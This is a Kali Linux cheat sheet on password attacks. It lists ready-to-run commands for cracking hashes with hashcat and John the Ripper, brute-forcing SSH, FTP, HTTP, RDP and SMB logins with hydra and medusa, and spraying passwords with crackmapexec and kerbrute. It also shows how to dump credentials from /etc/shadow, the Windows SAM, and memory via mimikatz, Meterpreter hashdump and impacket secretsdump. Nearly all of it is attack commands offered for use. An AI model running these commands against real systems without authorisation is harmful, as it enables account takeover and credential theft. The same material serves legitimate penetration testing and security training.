




# Kali — Password Attacks

> Password attacks = crack hashes offline or bruteforce auth online. Offline = you have the hash. Online = you're hitting a live service.

---

## Methodology

```
Get hash (from DB, file, memory, network)
    ↓
Identify hash type
    ↓
Offline crack (hashcat / john)
    ↓
If no hash → online bruteforce (hydra / medusa)
```

---

## Identify Hash Type

```bash
hash-identifier                     # interactive — paste hash
hashid 'hash_string'                # identify hash type
```

|Hash|Length|Example|
|---|---|---|
|MD5|32|`5f4dcc3b5aa765d61d8327deb882cf99`|
|SHA1|40|`5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`|
|SHA256|64|`5e884898da...`|
|bcrypt|60|`$2a$10$...`|
|NTLM|32|`8846f7eaee8fb117ad06bdd830b7586c`|
|SHA512crypt|long|`$6$salt$hash`|
|MD5crypt|long|`$1$salt$hash`|

## Hashcat — Offline Cracking

GPU-accelerated — much faster than John on modern hardware.

```bash
hashcat -m 0 hash.txt wordlist.txt              # MD5
hashcat -m 100 hash.txt wordlist.txt            # SHA1
hashcat -m 1800 hash.txt wordlist.txt           # SHA512crypt
hashcat -m 1000 hash.txt wordlist.txt           # NTLM
hashcat -m 3200 hash.txt wordlist.txt           # bcrypt
hashcat -m 0 hash.txt wordlist.txt --show       # show cracked
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule  # with rules
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a        # brute force mask
```

### Attack Modes

|Mode|Flag|Description|
|---|---|---|
|Dictionary|`-a 0`|Try every word in wordlist|
|Combinator|`-a 1`|Combine two wordlists|
|Brute force|`-a 3`|Try all combinations (mask)|
|Rule-based|`-a 0 -r`|Mutate wordlist with rules|

### Mask Characters

|Mask|Charset|
|---|---|
|`?l`|lowercase (a-z)|
|`?u`|uppercase (A-Z)|
|`?d`|digits (0-9)|
|`?s`|special characters|
|`?a`|all of the above|

```bash
# 8-char password: uppercase + lowercase + digits
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?l?l?d

# 6-digit PIN
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d
```

### Rules

```bash
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

## John the Ripper — Offline Cracking

More flexible formats, easier to use, slower than hashcat.

```bash
john hash.txt                                   # auto-detect + crack
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=bcrypt --wordlist=rockyou.txt
john hash.txt --rules --wordlist=rockyou.txt    # with mangling rules
john --show hash.txt                            # show cracked passwords
john --list=formats                             # list supported formats
```

### Useful John Modules

```bash
# crack /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# crack ZIP password
zip2john archive.zip > zip.hash
john zip.hash --wordlist=rockyou.txt

# crack SSH key passphrase
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt

# crack PDF password
pdf2john file.pdf > pdf.hash
john pdf.hash --wordlist=rockyou.txt

# crack Office documents
office2john file.docx > office.hash
john office.hash --wordlist=rockyou.txt
```

## Hydra — Online Bruteforce

```bash
# SSH
hydra -l user -P rockyou.txt ssh://10.0.0.1
hydra -L users.txt -P rockyou.txt ssh://10.0.0.1

# FTP
hydra -l admin -P rockyou.txt ftp://10.0.0.1

# HTTP POST login
hydra -l admin -P rockyou.txt 10.0.0.1 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET basic auth
hydra -l admin -P rockyou.txt http-get://10.0.0.1/admin

# RDP
hydra -l administrator -P rockyou.txt rdp://10.0.0.1

# SMB
hydra -l admin -P rockyou.txt smb://10.0.0.1
```

|Flag|Meaning|
|---|---|
|`-l`|Single username|
|`-L`|Username wordlist|
|`-p`|Single password|
|`-P`|Password wordlist|
|`-t`|Threads (default 16)|
|`-f`|Stop after first found|
|`-vV`|Verbose output|
|`-o`|Save output to file|

## Medusa — Online Bruteforce (Alternative)

```bash
medusa -h 10.0.0.1 -u admin -P rockyou.txt -M ssh
medusa -h 10.0.0.1 -U users.txt -P rockyou.txt -M ftp
medusa -h 10.0.0.1 -u admin -P rockyou.txt -M http -m DIR:/admin
```

## Password Spraying

Try one password against many users — avoids lockout.

```bash
# crackmapexec — spray against SMB
crackmapexec smb 10.0.0.1 -u users.txt -p 'Password123'
crackmapexec smb 10.0.0.0/24 -u admin -p 'Password123'  # whole subnet

# sprayhound, kerbrute for AD environments
kerbrute passwordspray -d domain.local users.txt 'Password123'
```

## Extracting Hashes

```bash
# Linux — from shadow file
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# Windows — from SAM (needs SYSTEM privileges)
# Metasploit meterpreter:
hashdump

# impacket — remote SAM dump
impacket-secretsdump admin:password@10.0.0.1

# mimikatz (Windows)
privilege::debug
sekurlsa::logonpasswords         # plaintext + hashes from memory
lsadump::sam                     # SAM database hashes
```

```bash
# generate targeted wordlist with cewl
cewl http://target.com -d 2 -m 5 -w wordlist.txt       # scrape website words
```

## Common Password Attack Workflow

```bash
# 1. get the hash
cat /etc/shadow
# or via Metasploit: hashdump

# 2. identify hash type
hashid '$6$salt$longhash...'

# 3. crack with hashcat
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# 4. if no hash — bruteforce service
hydra -l admin -P rockyou.txt ssh://10.0.0.1

# 5. if AD environment — spray
crackmapexec smb 10.0.0.1 -u users.txt -p 'Winter2024!'
```
